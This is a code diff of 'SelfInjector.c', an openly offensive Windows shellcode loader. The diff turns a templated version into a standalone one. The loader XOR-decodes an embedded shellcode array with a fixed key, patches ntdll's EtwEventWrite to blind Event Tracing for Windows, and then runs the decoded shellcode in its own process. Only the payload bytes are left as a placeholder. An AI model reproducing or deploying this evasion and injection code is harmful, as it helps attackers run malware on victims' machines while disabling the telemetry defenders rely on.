@@ -1,8 +1,10 @@
+// SelfInjector.c
 #include <windows.h>
 
+// A function that performs a XOR operation on a BYTE array of size sz with a static key of 0xf7.
 BYTE* XOR(BYTE* buf, size_t sz)
 {
-	char key = {{ XOR_KEY }};
+	char key = 0xf7;
 
 	for (int i = 0; i < (int)sz; i++)
 		buf[i] = buf[i] ^ key;
@@ -10,7 +12,8 @@ BYTE* XOR(BYTE* buf, size_t sz)
 	return buf;
 }
 
-{% if PATCH_ETW %}
+
+// A function that patches "ntdll.dll!EtwEventWrite" to prevent ETW event reporting.
 void PatchETW()
 {
 	void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
@@ -25,11 +28,13 @@ void PatchETW()
 	WriteProcessMemory(GetCurrentProcess(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)NULL);
 	VirtualProtect((LPVOID)&etwAddr_bk, (SIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
 }
-{% endif %}
 
 void Inject()
 {
-	unsigned char shellcode[] = { {{ "shellcode.bin" | content | xor | hexarr }} };
+	unsigned char shellcode[] = { 
+		/* Insert a XOR'ed version of your shellcode here, in a byte array format. */
+		0x0
+	};
 
 	XOR(shellcode, sizeof(shellcode));
 
@@ -38,19 +43,10 @@ void Inject()
 	((void(*)())exec)();
 }
 
-void Go()
-{
-	{% if PATCH_ETW%}
-	PatchETW();
-	{% endif %}
-
-	Inject();
-}
-
-
 int main(int argc, char* argv)
 {
-	Go();
+    PatchETW();
+    Inject();
 
-	while(TRUE){}
+    while(TRUE){}
 }
